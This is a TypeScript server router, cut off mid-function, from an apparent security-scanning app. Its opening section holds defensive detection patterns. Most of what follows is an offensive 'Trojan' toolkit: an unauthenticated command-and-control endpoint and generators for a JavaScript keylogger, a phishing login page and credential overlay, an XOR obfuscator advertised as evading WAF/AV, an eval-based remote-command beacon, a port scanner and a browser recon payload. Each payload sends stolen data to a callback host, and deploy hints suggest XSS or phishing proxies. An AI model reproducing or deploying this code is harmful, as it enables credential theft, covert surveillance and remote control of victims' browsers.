  if (wow64Paths.length > 0) {
    findings.push({
      technique: "WinAPI x64 — WOW64 filesystem redirection leak",
      module: "Win64 Platform Analysis",
      title: "WOW64 Path Exposed (32-bit Subsystem Indicator)",
      description: "Response contains WOW64 or 'Program Files (x86)' path references. WOW64 is the compatibility layer running legacy 32-bit code on 64-bit Windows 10/11. Exposing these paths reveals internal architecture and legacy component usage that attackers can target.",
      severity: "medium",
      evidence: wow64Paths.slice(0, 3).join(" | "),
      recommendation: "Sanitize all error messages and stack traces. Modern 64-bit apps use C:\\Windows\\System32 (not SysWOW64). Eliminate 32-bit COM/ActiveX dependencies — they force WOW64 and weaken CFG/ACG mitigations.",
    });
  }

  // NTAPI / direct syscall function names exposed in response
  const ntapiCalls = (body.match(/Nt(?:AllocateVirtualMemory|CreateThreadEx|WriteVirtualMemory|OpenProcess|QuerySystemInformation|ProtectVirtualMemory|SetContextThread|ResumeThread|CreateSection|MapViewOfSection|UnmapViewOfSection|SuspendProcess)/g) ?? []);
  if (ntapiCalls.length > 0) {
    findings.push({
      technique: "WinAPI x64 — NTAPI direct syscall exposure",
      module: "Win64 Platform Analysis",
      title: `NTAPI Function Names Exposed (${ntapiCalls.length} calls)`,
      description: "Native NT API function names found in response. NTAPI is the undocumented low-level Windows kernel interface — used by advanced malware to bypass EDR/AV hooks that sit in Win32 (kernel32.dll/ntdll.dll). These names appearing in a web response indicate debug artifacts, intrusion tool signatures, or server-side code execution leakage.",
      severity: "high",
      evidence: ntapiCalls.slice(0, 4).join(" | "),
      recommendation: "Remove all debug output. Strip symbol names from production binaries. NTAPI strings in web responses indicate server-side code execution leak or path traversal into Windows system directories.",
    });
  }

  // Heaven's Gate indicator (0x33 far call — switches x86 WOW64 process to native x64 segment)
  if (/heaven.?s.?gate|wow64cpu|wow64transition|wow64systemservice|far.?call.?0x33/i.test(body)) {
    findings.push({
      technique: "WinAPI x64 — Heaven's Gate x86→x64 segment switch",
      module: "Win64 Platform Analysis",
      title: "Heaven's Gate Technique Indicator Detected",
      description: "References to Heaven's Gate — the 0x33 far call / CS segment switch used by 32-bit malware to execute native 64-bit code inside a WOW64 process. This technique bypasses 32-bit API monitoring hooks on Windows 10/11 and is used by sophisticated malware families (Lazarus, Cobalt Strike, etc.).",
      severity: "critical",
      evidence: (body.match(/heaven.?s.?gate|wow64transition|wow64cpu/i)?.[0] ?? "").substring(0, 80),
      recommendation: "Investigate immediately. Heaven's Gate is only seen in advanced malware evading Windows 64-bit EDR. Enable ETW (Event Tracing for Windows) and CFG (Control Flow Guard) to detect unauthorized far calls.",
    });
  }

  // x64 PE header or shellcode byte sequences exposed
  const pePatterns = (body.match(/\\x48\\x31|\\x48\\x83|\\x48\\x89|\\xff\\xd0|\\x4c\\x8b|\\x41\\xff\\xd4/g) ?? []);
  if (pePatterns.length > 3) {
    findings.push({
      technique: "WinAPI x64 — x64 shellcode byte sequence exposure",
      module: "Win64 Platform Analysis",
      title: "x64 Shellcode Byte Patterns Detected",
      description: `${pePatterns.length} x64 shellcode byte sequences (REX prefix \\x48, \\x4C + 64-bit MOV/CALL patterns) found in response. These are characteristic of 64-bit Windows shellcode — the REX.W prefix (\\x48) marks 64-bit operand size in x64 assembly.`,
      severity: "critical",
      evidence: pePatterns.slice(0, 3).join(" | "),
      recommendation: "Block binary content from web endpoints. Scan all uploaded/downloaded content for shellcode signatures. Ensure no file upload endpoint serves executable content without strict content-type enforcement.",
    });
  }

  // Wow6432Node registry path (32-bit registry redirect on 64-bit Windows)
  const reg64Paths = (body.match(/Wow6432Node|SOFTWARE\\\\Wow6432|HKLM\\\\System\\\\CurrentControlSet\\\\Services/g) ?? []);
  if (reg64Paths.length > 0) {
    findings.push({
      technique: "WinAPI x64 — 64-bit registry hive path exposure",
      module: "Win64 Platform Analysis",
      title: "Windows 64-bit Registry Paths Exposed (Wow6432Node)",
      description: "Wow6432Node is the 32-bit registry redirect on 64-bit Windows — 32-bit apps see HKLM\\SOFTWARE\\Wow6432Node instead of HKLM\\SOFTWARE. Its presence indicates registry enumeration artifacts or legacy 32-bit component configuration being leaked.",
      severity: "medium",
      evidence: reg64Paths[0].substring(0, 80),
      recommendation: "Remove all registry path references from web responses. Enable production error suppression. Audit for path traversal vulnerabilities targeting Windows registry hive files.",
    });
  }

  // Deprecated Win32 API names in responses (GetVersionEx removed from Win8.1+)
  const deprecatedWin32 = (body.match(/GetVersionEx|GetSystemInfo\b|GlobalMemoryStatusEx|EnumServicesStatus|CreateToolhelp32Snapshot|Process32First|VirtualAllocEx\b/g) ?? []);
  if (deprecatedWin32.length > 0) {
    findings.push({
      technique: "WinAPI x64 — deprecated Win32 API usage",
      module: "Win64 Platform Analysis",
      title: `Deprecated Win32 API Names Found (${deprecatedWin32.length})`,
      description: `Legacy Win32 APIs found: ${deprecatedWin32.join(", ")}. GetVersionEx was removed/broken in Windows 8.1+. These deprecated APIs are unreliable on modern 64-bit Windows and signal legacy code that may not account for 64-bit memory layout, ASLR, or CFG.`,
      severity: "medium",
      evidence: deprecatedWin32.slice(0, 4).join(" | "),
      recommendation: "Migrate to modern Win64 equivalents: GetVersionEx→RtlGetVersion, GlobalMemoryStatusEx→GetPhysicallyInstalledSystemMemory, CreateToolhelp32Snapshot→NtQuerySystemInformation, VirtualAllocEx→NtAllocateVirtualMemory.",
    });
  }

  // Modern isolation headers (required for SharedArrayBuffer on Win64 Chrome/Edge)
  const corp = headers["cross-origin-resource-policy"] ?? "";
  const coep = headers["cross-origin-embedder-policy"] ?? "";
  const coop = headers["cross-origin-opener-policy"] ?? "";
  const missing = [!corp && "Cross-Origin-Resource-Policy", !coep && "Cross-Origin-Embedder-Policy", !coop && "Cross-Origin-Opener-Policy"].filter(Boolean) as string[];
  if (missing.length > 0) {
    findings.push({
      technique: "WinAPI x64 — Spectre/Meltdown cross-origin isolation",
      module: "Win64 Platform Analysis",
      title: `Missing Win64-Era Isolation Headers: ${missing.map(h => h.replace("Cross-Origin-", "CO")).join(", ")}`,
      description: `Modern isolation headers missing: ${missing.join(", ")}. These were introduced specifically to mitigate Spectre/Meltdown — CPU-level side-channel attacks that exploit 64-bit out-of-order execution on Intel/AMD processors. Required for SharedArrayBuffer on Windows 10/11 Chrome and Edge.`,
      severity: "medium",
      evidence: `Missing: ${missing.join(", ")}`,
      recommendation: "Add: Cross-Origin-Resource-Policy: same-origin | Cross-Origin-Embedder-Policy: require-corp | Cross-Origin-Opener-Policy: same-origin",
    });
  }

  // Check incoming User-Agent for x64 Windows confirmation
  const ua = headers["user-agent"] ?? "";
  if (/Windows NT [0-9.]+; Win64; x64/i.test(ua)) {
    findings.push({
      technique: "WinAPI x64 — 64-bit Windows client fingerprint",
      module: "Win64 Platform Analysis",
      title: "64-bit Windows Client Confirmed (Win64; x64 UA)",
      description: "Incoming User-Agent contains 'Win64; x64' — confirming a native 64-bit Windows 10/11 browser. Note: navigator.platform always returns 'Win32' in all browsers even on 64-bit Windows (deliberate compat quirk). Parse the UA string for real architecture detection.",
      severity: "info",
      evidence: ua.substring(0, 120),
      recommendation: "Modern 64-bit Windows provides full ASLR, DEP, CFG, and CET (Control-flow Enforcement Technology on Win11). Ensure your app relies on these mitigations. Drop any legacy 32-bit ActiveX/COM components that bypass them via WOW64.",
    });
  } else if (/Windows NT [0-9.]+; WOW64/i.test(ua)) {
    findings.push({
      technique: "WinAPI x64 — WOW64 browser process (32-bit browser on 64-bit OS)",
      module: "Win64 Platform Analysis",
      title: "32-bit Browser on 64-bit Windows Detected (WOW64 UA)",
      description: "User-Agent contains 'WOW64' — indicating a 32-bit browser running under the WOW64 compatibility layer on a 64-bit Windows system. 32-bit browser processes have weaker ASLR entropy and cannot use 64-bit CFG. This is a legacy configuration on modern Windows 10/11.",
      severity: "low",
      evidence: ua.substring(0, 120),
      recommendation: "Advise users to switch to a 64-bit browser (Chrome x64, Edge x64, Firefox x64). 32-bit browsers on WOW64 lose full ASLR range and 64-bit CFG protections.",
    });
  }

  return findings;
}

// ─── Scan Endpoint ────────────────────────────────────────────────────────────

const ScanSchema = z.object({
  url: z.string().url(),
  modules: z.array(z.enum(["keylogger", "credentials", "crypto", "c2", "disclosure", "ui", "tracking", "waf", "win64"])).optional(),
});

router.post("/scan", async (req, res) => {
  const parsed = ScanSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: parsed.error.flatten() });

  const { url, modules } = parsed.data;
  const runAll = !modules || modules.length === 0;
  const run = (m: string) => runAll || (modules ?? []).includes(m as any);

  let result: { headers: Record<string, string>; body: string; status: number; redirectUrl?: string };
  try {
    result = await fetchTarget(url);
  } catch (err: any) {
    return res.status(200).json({ ok: false, error: `Failed to fetch target: ${err.message}`, findings: [] });
  }

  const { headers, body, status, redirectUrl } = result;
  const allFindings: Finding[] = [];

  if (run("keylogger"))   allFindings.push(...scanKeyloggerPatterns(body, headers));
  if (run("credentials")) allFindings.push(...scanCredentialExposure(body, headers, url));
  if (run("crypto"))      allFindings.push(...scanCryptoWeaknesses(body, headers));
  if (run("c2"))          allFindings.push(...scanC2Patterns(body, headers, url));
  if (run("disclosure"))  allFindings.push(...scanInfoDisclosure(body, headers, status));
  if (run("ui"))          allFindings.push(...scanUISecurityHeaders(headers));
  if (run("tracking"))    allFindings.push(...scanTrackingPatterns(body));
  if (run("waf"))         allFindings.push(...await scanWafFingerprint(url));
  if (run("win64"))       allFindings.push(...scanWin64Patterns(body, headers));

  allFindings.sort((a, b) => sev(b.severity) - sev(a.severity));

  const counts: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
  for (const f of allFindings) counts[f.severity]++;

  const score = Math.max(0, 100
    - counts.critical * 20
    - counts.high * 10
    - counts.medium * 5
    - counts.low * 2
  );

  return res.json({
    ok: true,
    url,
    redirectUrl,
    status,
    scanTime: new Date().toISOString(),
    score,
    counts,
    modulesRun: runAll ? "all" : modules,
    findings: allFindings,
    headers: {
      server: headers["server"] ?? null,
      csp: headers["content-security-policy"] ?? null,
      hsts: headers["strict-transport-security"] ?? null,
      xfo: headers["x-frame-options"] ?? null,
      xcto: headers["x-content-type-options"] ?? null,
      xpb: headers["x-powered-by"] ?? null,
      cors: headers["access-control-allow-origin"] ?? null,
    },
  });
});

// Quick single-module probes
router.post("/headers", async (req, res) => {
  const { url } = z.object({ url: z.string().url() }).parse(req.body);
  const { headers, status } = await fetchTarget(url);
  const securityHeaders = [
    "content-security-policy", "strict-transport-security", "x-frame-options",
    "x-content-type-options", "referrer-policy", "permissions-policy",
    "access-control-allow-origin", "server", "x-powered-by", "set-cookie",
    "www-authenticate", "cache-control",
  ];
  const result: Record<string, string | null> = {};
  for (const h of securityHeaders) result[h] = headers[h] ?? null;
  res.json({ ok: true, status, headers: result });
});

// ═══════════════════════════════════════════════════════════════════════════════
// ATTACK TOOLKIT — Twizted v1.0 Trojan Technique Implementations
// For authorized self-testing ONLY. Developers deploy these against their own
// systems to verify real defenses hold against real attack scenarios.
// Sources: Keylog.bas · Password.bas · Crypt.bas · CLIENT.BAS
//          Firewall.bas · Global.bas · disablectlaltdel.bas · Monitor.bas
// ═══════════════════════════════════════════════════════════════════════════════

import net from "net";

// ─── C2 In-Memory Store ───────────────────────────────────────────────────────
// keyed by sessionId → event list (newest first)
const c2Sessions = new Map<string, { ts: string; type: string; data: any; ip: string; ua: string }[]>();
const c2Commands = new Map<string, string[]>(); // sessionId → pending JS commands
const MAX_C2_SESSIONS  = 50;
const MAX_C2_EVENTS    = 200;

function c2Prune() {
  if (c2Sessions.size > MAX_C2_SESSIONS) {
    const oldest = [...c2Sessions.keys()].slice(0, c2Sessions.size - MAX_C2_SESSIONS);
    oldest.forEach(k => { c2Sessions.delete(k); c2Commands.delete(k); });
  }
}

// PUBLIC ─ POST /redteam-scan/c2/ingest
// Receives callbacks from all deployed payloads. Registered before requireAuth
// in index.ts so payloads can reach it cross-origin without auth cookies.
router.post("/c2/ingest", (req, res) => {
  const sid  = String((req.query.sid as string) || req.body?.sid || "default").slice(0, 64);
  const ip   = String(req.headers["x-forwarded-for"] || req.socket.remoteAddress || "?").split(",")[0].trim();
  const ua   = String(req.headers["user-agent"] || "");
  const type = String((req.query.t  as string) || req.body?.t  || "beacon");
  const data = req.body ?? {};

  if (!c2Sessions.has(sid)) c2Sessions.set(sid, []);
  const evts = c2Sessions.get(sid)!;
  if (evts.length < MAX_C2_EVENTS) evts.unshift({ ts: new Date().toISOString(), type, data, ip, ua });
  c2Prune();

  res.header("Access-Control-Allow-Origin", "*");
  // Return any queued command for this session
  const cmds = c2Commands.get(sid) ?? [];
  const cmd  = cmds.shift();
  res.json({ ok: true, cmd: cmd ?? null });
});

router.options("/c2/ingest", (_req, res) => {
  res.header("Access-Control-Allow-Origin",  "*");
  res.header("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  res.sendStatus(204);
});

// GET /redteam-scan/c2/events?sid=...
router.get("/c2/events", (req, res) => {
  const sid = String((req.query.sid as string) || "default").slice(0, 64);
  res.json({ ok: true, sid, events: c2Sessions.get(sid) ?? [] });
});

// DELETE /redteam-scan/c2/events?sid=...
router.delete("/c2/events", (req, res) => {
  const sid = String((req.query.sid as string) || "default").slice(0, 64);
  c2Sessions.delete(sid);
  c2Commands.delete(sid);
  res.json({ ok: true, cleared: true });
});

// POST /redteam-scan/c2/cmd — push JS command to be picked up by next beacon poll
router.post("/c2/cmd", (req, res) => {
  const { sid, code } = req.body as { sid: string; code: string };
  if (!sid || !code) return res.status(400).json({ error: "sid and code required" });
  if (!c2Commands.has(sid)) c2Commands.set(sid, []);
  c2Commands.get(sid)!.push(String(code).slice(0, 4096));
  return res.json({ ok: true, queued: true });
});

// ─── Payload Generators ───────────────────────────────────────────────────────

// POST /redteam-scan/toolkit/keylogger  (Keylog.bas)
// Generates a JS keylogger payload: captures keystrokes, form submits, clipboard pastes
router.post("/toolkit/keylogger", (req, res) => {
  const { callbackUrl, sid = "default", flushInterval = 15, minKeys = 10 } = req.body as {
    callbackUrl: string; sid?: string; flushInterval?: number; minKeys?: number;
  };
  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });

  const payload = `/* Keylog.bas → JavaScript Keylogger | Twizted v1.0 technique */
(function(){
  var _cb='${callbackUrl}', _sid='${sid}', _buf=[], _fi=${Math.max(5,Number(flushInterval))}, _mn=${Math.max(1,Number(minKeys))};
  function _flush(){
    if(_buf.length===0)return;
    var d=JSON.stringify({t:'keylog',sid:_sid,d:_buf,url:location.href,ts:Date.now()});
    try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=keylog',d)}catch(e){fetch(_cb+'?sid='+_sid+'&t=keylog',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
    _buf=[];
  }
  // Capture individual keystrokes (Keylog.bas GetAsyncKeyState equivalent)
  document.addEventListener('keydown',function(e){
    _buf.push({k:e.key,kc:e.keyCode,ctrl:e.ctrlKey,shift:e.shiftKey,alt:e.altKey,el:(document.activeElement||{}).tagName||'?',ts:Date.now()});
    if(_buf.length>=_mn)_flush();
  },true);
  // Capture form submissions — full field values (Password.bas crossover)
  document.addEventListener('submit',function(e){
    var fd={},form=e.target;
    try{new FormData(form).forEach(function(v,k){fd[k]=v})}catch(ex){}
    var d=JSON.stringify({t:'form_submit',sid:_sid,d:fd,action:(form.action||location.href),url:location.href,ts:Date.now()});
    try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=form',d)}catch(e){fetch(_cb+'?sid='+_sid+'&t=form',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
  },true);
  // Capture clipboard paste (clipboard API monitoring)
  document.addEventListener('paste',function(e){
    var txt='';try{txt=(e.clipboardData||window.clipboardData).getData('text')}catch(ex){}
    if(txt){_buf.push({k:'[PASTE:'+txt.slice(0,200)+']',el:(document.activeElement||{}).tagName||'?',ts:Date.now()})}
  },true);
  // Flush on interval and page unload
  setInterval(_flush,_fi*1000);
  window.addEventListener('beforeunload',_flush);
})();`;

  return res.json({ ok: true, module: "Keylog.bas", payload, language: "javascript",
    deployHint: "Inject via <script> tag, XSS, or browser extension. Runs silently in page context." });
});

// POST /redteam-scan/toolkit/credential-harvester  (Password.bas)
// Generates: (1) standalone HTML phishing page, (2) JS overlay injector
router.post("/toolkit/credential-harvester", (req, res) => {
  const { callbackUrl, sid = "default", targetBrand = "Login", mode = "page" } = req.body as {
    callbackUrl: string; sid?: string; targetBrand?: string; mode?: "page" | "overlay";
  };
  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });

  const pagePl = `<!DOCTYPE html>
<!-- Password.bas → Credential Harvester | Twizted v1.0 technique -->
<html><head><meta charset="utf-8"><title>${targetBrand}</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#0f0f0f;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:system-ui,sans-serif}
.card{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:40px;width:100%;max-width:400px}
h2{color:#fff;margin-bottom:24px;font-size:20px}label{color:#aaa;font-size:13px;display:block;margin-bottom:6px}
input{width:100%;background:#111;border:1px solid #444;color:#fff;padding:10px 14px;border-radius:6px;font-size:14px;margin-bottom:16px}
input:focus{outline:none;border-color:#0080ff}button{width:100%;background:#0080ff;color:#fff;border:none;padding:12px;border-radius:6px;font-size:15px;cursor:pointer;font-weight:600}
.err{color:#f55;font-size:12px;margin-top:8px;display:none}</style></head>
<body><div class="card"><h2>${targetBrand}</h2>
<form id="f"><label>Email / Username</label><input type="text" id="u" autocomplete="username" required>
<label>Password</label><input type="password" id="p" autocomplete="current-password" required>
<button type="submit">Sign in</button><div class="err" id="e">Invalid credentials. Please try again.</div></form></div>
<script>document.getElementById('f').addEventListener('submit',function(ev){ev.preventDefault();
var d=JSON.stringify({t:'creds',sid:'${sid}',username:document.getElementById('u').value,password:document.getElementById('p').value,ua:navigator.userAgent,url:location.href,ts:Date.now()});
fetch('${callbackUrl}?sid=${sid}&t=creds',{method:'POST',body:d,headers:{'Content-Type':'application/json'}}).catch(function(){navigator.sendBeacon('${callbackUrl}?sid=${sid}&t=creds',d)});
document.getElementById('e').style.display='block';document.getElementById('p').value='';});</script></body></html>`;

  const overlayPl = `/* Password.bas → Credential Overlay Injector | Twizted v1.0 technique */
(function(){
  var _cb='${callbackUrl}',_sid='${sid}';
  var _el=document.createElement('div');
  _el.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif';
  _el.innerHTML='<div style="background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:40px;width:380px"><h2 style="color:#fff;margin-bottom:20px;font-size:18px">Session expired — sign in again</h2><label style="color:#aaa;font-size:13px;display:block;margin-bottom:6px">Email / Username</label><input id="_u" type="text" style="width:100%;background:#111;border:1px solid #444;color:#fff;padding:10px;border-radius:6px;font-size:14px;margin-bottom:12px"><label style="color:#aaa;font-size:13px;display:block;margin-bottom:6px">Password</label><input id="_p" type="password" style="width:100%;background:#111;border:1px solid #444;color:#fff;padding:10px;border-radius:6px;font-size:14px;margin-bottom:16px"><button id="_sb" style="width:100%;background:#0080ff;color:#fff;border:none;padding:12px;border-radius:6px;font-size:15px;cursor:pointer">Continue</button></div>';
  document.body.appendChild(_el);
  document.getElementById('_sb').addEventListener('click',function(){
    var d=JSON.stringify({t:'overlay_creds',sid:_sid,username:document.getElementById('_u').value,password:document.getElementById('_p').value,host:location.hostname,ua:navigator.userAgent,ts:Date.now()});
    fetch(_cb+'?sid='+_sid+'&t=creds',{method:'POST',body:d,headers:{'Content-Type':'application/json'}}).catch(function(){navigator.sendBeacon(_cb+'?sid='+_sid+'&t=creds',d)});
    _el.remove();
  });
})();`;

  return res.json({ ok: true, module: "Password.bas", payloads: { page: pagePl, overlay: overlayPl }, language: mode === "overlay" ? "javascript" : "html",
    payload: mode === "overlay" ? overlayPl : pagePl,
    deployHint: mode === "overlay" ? "Inject via <script> tag or XSS — overlays a sign-in modal on any page." : "Host as standalone HTML page or serve via phishing proxy." });
});

// POST /redteam-scan/toolkit/obfuscate  (Crypt.bas)
// XOR-encodes any payload with a key, outputs self-decoding JS stub
router.post("/toolkit/obfuscate", (req, res) => {
  const { payload: rawPayload, key = "TWIZTED", wrapEval = true } = req.body as {
    payload: string; key?: string; wrapEval?: boolean;
  };
  if (!rawPayload) return res.status(400).json({ error: "payload required" });

  const k = String(key || "TWIZTED");
  const bytes = Buffer.from(rawPayload, "utf8");
  const xored: number[] = [];
  for (let i = 0; i < bytes.length; i++) xored.push(bytes[i] ^ k.charCodeAt(i % k.length));
  const encoded = Buffer.from(xored).toString("base64");

  // Also generate hex-encoded version (Crypt.bas used both)
  const hexStr = xored.map(b => b.toString(16).padStart(2, "0")).join("");

  const stub = `/* Crypt.bas → XOR Obfuscated Payload | Twizted v1.0 technique | key="${k}" */
(function(){var _d='${encoded}',_k='${k}',_r=atob(_d);var _b=new Uint8Array(_r.length);for(var i=0;i<_r.length;i++)_b[i]=_r.charCodeAt(i)^_k.charCodeAt(i%_k.length);var _s=new TextDecoder().decode(_b);${wrapEval ? "eval(_s);" : "/* decoded in _s: use _s as needed */"}})()\n/* hex: ${hexStr.slice(0, 80)}${hexStr.length > 80 ? "…" : ""} */`;

  return res.json({ ok: true, module: "Crypt.bas", payload: stub, language: "javascript",
    key: k, encodedLength: encoded.length, hexPreview: hexStr.slice(0, 64),
    deployHint: "Wrap any payload in XOR obfuscation. Bypasses naive string-based WAF/AV detection." });
});

// POST /redteam-scan/toolkit/c2-beacon  (CLIENT.BAS)
// Generates a C2 beacon payload — polls for commands, exfiltrates session context
router.post("/toolkit/c2-beacon", (req, res) => {
  const { callbackUrl, sid, intervalMs = 5000, stealStorage = true, stealCookies = true } = req.body as {
    callbackUrl: string; sid?: string; intervalMs?: number; stealStorage?: boolean; stealCookies?: boolean;
  };
  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });
  const beaconSid = sid || Math.random().toString(36).substring(2, 11);

  const payload = `/* CLIENT.BAS → C2 Beacon | Twizted v1.0 technique */
(function(){
  var _cb='${callbackUrl}',_sid='${beaconSid}',_iv=${Math.max(2000,Number(intervalMs))};
  var _tick=0;
  function _gather(){
    var o={t:'beacon',sid:_sid,tick:_tick++,url:location.href,ref:document.referrer,ua:navigator.userAgent,ts:Date.now()${stealStorage ? `,ls_keys:Object.keys(localStorage||{}),ss_keys:Object.keys(sessionStorage||{})` : ""}${stealCookies ? `,cookie_count:(document.cookie||'').split(';').filter(function(c){return c.trim()}).length` : ""}};
    // Also grab any visible form field values
    var fv={};document.querySelectorAll('input:not([type=hidden]),select,textarea').forEach(function(el){if(el.name&&el.value&&el.type!=='password')fv[el.name]=el.value;});
    if(Object.keys(fv).length)o.form_vals=fv;
    return o;
  }
  function _beacon(){
    var d=JSON.stringify(_gather());
    fetch(_cb+'?sid='+_sid+'&t=beacon',{method:'POST',body:d,headers:{'Content-Type':'application/json'},mode:'cors',credentials:'omit'})
      .then(function(r){return r.json()})
      .then(function(resp){if(resp&&resp.cmd){try{eval(resp.cmd)}catch(ex){console.warn('cmd err',ex)}}})
      .catch(function(){try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=beacon',d)}catch(ex){}});
  }
  setInterval(_beacon,_iv);
  _beacon();
  // Also beacon on page visibility change (tab switch detection)
  document.addEventListener('visibilitychange',function(){if(document.visibilityState==='visible')_beacon()});
})();`;

  return res.json({ ok: true, module: "CLIENT.BAS", payload, language: "javascript",
    sid: beaconSid, intervalMs, deployHint: "Inject into target page. Beacons home every " + (intervalMs/1000) + "s. Use C2 Command Console to push eval code." });
});

// POST /redteam-scan/toolkit/port-scan  (Firewall.bas)
// TCP connect scan — tests which ports are open on a target host
router.post("/toolkit/port-scan", async (req, res) => {
  const { host, ports, timeoutMs = 1500 } = req.body as { host: string; ports: number[]; timeoutMs?: number };
  if (!host || !Array.isArray(ports) || ports.length === 0) return res.status(400).json({ error: "host and ports[] required" });
  if (ports.length > 500) return res.status(400).json({ error: "Max 500 ports per scan" });

  const to = Math.min(Math.max(Number(timeoutMs), 300), 5000);

  function tcpProbe(h: string, port: number): Promise<{ port: number; open: boolean; banner?: string }> {
    return new Promise(resolve => {
      const sock = new net.Socket();
      let banner = "";
      const timer = setTimeout(() => { sock.destroy(); resolve({ port, open: false }); }, to);
      sock.connect(port, h, () => {
        clearTimeout(timer);
        sock.setTimeout(600, () => { sock.destroy(); resolve({ port, open: true, banner: banner.trim().slice(0, 80) }); });
      });
      sock.on("data", (d: Buffer) => { banner += d.toString("utf8"); });
      sock.on("close", () => { clearTimeout(timer); resolve({ port, open: true, banner: banner.trim().slice(0, 80) }); });
      sock.on("error", () => { clearTimeout(timer); resolve({ port, open: false }); });
    });
  }

  const COMMON_SERVICES: Record<number, string> = {
    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",
    443:"HTTPS",445:"SMB",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",
    6379:"Redis",8080:"HTTP-Alt",8443:"HTTPS-Alt",27017:"MongoDB",
  };

  const results = await Promise.all(ports.map(p => tcpProbe(host, p)));
  const open = results.filter(r => r.open).map(r => ({ ...r, service: COMMON_SERVICES[r.port] || "?" }));

  return res.json({ ok: true, module: "Firewall.bas", host, scanned: ports.length, open,
    deployHint: "TCP connect scan from the ProxhqVPN API server. Tests firewall rule coverage." });
});

// POST /redteam-scan/toolkit/sysrecon  (Global.bas)
// Generates a browser-side system recon payload — collects navigator, screen, GPU, fonts
router.post("/toolkit/sysrecon", (req, res) => {
  const { callbackUrl, sid = "default" } = req.body as { callbackUrl: string; sid?: string };
  if (!callbackUrl) return res.status(400).json({ error: "callbackUrl required" });

  const payload = `/* Global.bas → System Recon | Twizted v1.0 technique */
(function(){
  var _cb='${callbackUrl}',_sid='${sid}';
  function _glr(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(!gl)return'n/a';var ext=gl.getExtension('WEBGL_debug_renderer_info');return gl.getParameter(ext?ext.UNMASKED_RENDERER_WEBGL:gl.RENDERER);}catch(e){return'n/a'}}
  function _fonts(){var tFonts=['Arial','Calibri','Cambria','Comic Sans MS','Courier New','Georgia','Helvetica','Impact','Times New Roman','Trebuchet MS','Verdana','Wingdings','Consolas','Monaco'],found=[];var s=document.createElement('span');s.style.cssText='position:absolute;left:-9999px;font-size:72px';document.body.appendChild(s);var _def={w:0,h:0};s.style.fontFamily='monospace';_def.w=s.offsetWidth;_def.h=s.offsetHeight;tFonts.forEach(function(f){s.style.fontFamily=f+',monospace';if(s.offsetWidth!==_def.w||s.offsetHeight!==_def.h)found.push(f)});document.body.removeChild(s);return found}
  function _battery(){if(navigator.getBattery)return navigator.getBattery().then(function(b){return{charging:b.charging,level:Math.round(b.level*100),chargingTime:b.chargingTime}}).catch(function(){return null});return Promise.resolve(null)}
  _battery().then(function(batt){
    var info={t:'sysrecon',sid:_sid,ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,langs:(navigator.languages||[]).join(','),plugins:Array.from(navigator.plugins||[]).map(function(p){return p.name}).join('|'),screen:screen.width+'x'+screen.height+'@'+screen.colorDepth+'bit',avail:screen.availWidth+'x'+screen.availHeight,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,touch:'ontouchstart'in window,cookieEnabled:navigator.cookieEnabled,storage:typeof localStorage!=='undefined',idb:typeof indexedDB!=='undefined',sw:typeof navigator.serviceWorker!=='undefined',webgl:_glr(),fonts:_fonts(),battery:batt,connection:navigator.connection?{type:(navigator.connection.effectiveType||'?'),down:(navigator.connection.downlink||0)+'Mb'}:null,hardwareConcurrency:navigator.hardwareConcurrency||0,memory:(navigator.deviceMemory||0)+'GB',url:location.href,ref:document.referrer,ls_keys:Object.keys(localStorage||{}),ss_keys:Object.keys(sessionStorage||{}),cookie_len:(document.cookie||'').length,ts:new Date().toISOString()};
    var d=JSON.stringify(info);
    try{navigator.sendBeacon(_cb+'?sid='+_sid+'&t=sysrecon',d)}catch(ex){fetch(_cb+'?sid='+_sid+'&t=sysrecon',{method:'POST',body:d,mode:'no-cors'}).catch(function(){})}
  });
})();`;

  return res.json({ ok: true, module: "Global.bas", payload, language: "javascript",
    deployHint: "Single-shot recon. Fires on load, collects full browser fingerprint, and beacons home." });
});

// POST /redteam-scan/toolkit/keyhijack  (disablectlaltdel.bas)
// Generates a keyboard hijack + browser lockout payload
router.post("/toolkit/keyhijack", (req, res) => {
  const { blockDevTools = true, blockViewSource = true, blockRightClick = true, blockCopyPaste = false, callbackUrl, sid = "default" } = req.body as {
    blockDevTools?: boolean; blockViewSource?: boolean; blockRightClick?: boolean; blockCopyPaste?: boolean;
    callbackUrl?: string; sid?: string;
  };

  const payload = `/* disablectlaltdel.bas → Keyboard Hijack | Twizted v1.0 technique */
(function(){
  var _blocked=[];
  document.addEventListener('keydown',function(e){
    // DevTools / inspection (Ctrl+Shift+I/J/C, F12)
    if(${blockDevTools}){if(e.key==='F12'){e.preventDefault();e.stopPropagation();_blocked.push('F12');return false}if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'||e.key==='C')){e.preventDefault();e.stopPropagation();return false}}
    // View source (Ctrl+U), Save (Ctrl+S), Print (Ctrl+P)
    if(${blockViewSource}){if(e.ctrlKey&&(e.key==='u'||e.key==='U'||e.key==='s'||e.key==='S'||e.key==='p'||e.key==='P')){e.preventDefault();e.stopPropagation();return false}}
    // Copy/paste (Ctrl+C/V/A/X)
